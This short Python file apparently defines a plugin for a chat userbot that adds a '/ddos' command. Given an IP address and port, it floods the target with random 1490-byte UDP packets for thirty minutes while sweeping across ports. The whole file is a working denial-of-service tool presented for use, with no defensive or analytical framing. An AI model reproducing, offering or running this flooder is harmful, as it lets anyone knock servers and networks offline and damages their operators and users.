import sys
import os
import time
import socket
import random
from alexa.events import alexabot

@alexabot(outgoing=True, pattern="/ddos (.*) (.*)")
async def ddos(event): 
  ip = event.pattern_match.group(1)
  portt = event.pattern_match.group(2)
  
  port = int(portt)
  timeout = 1800
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  bytes = random._urandom(1490)
  sent = 0
  timeout_start = time.time()
  while time.time() < timeout_start + timeout:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(f"sending {sent} no packets to {port}")
     if port == 65534:
       port = 1
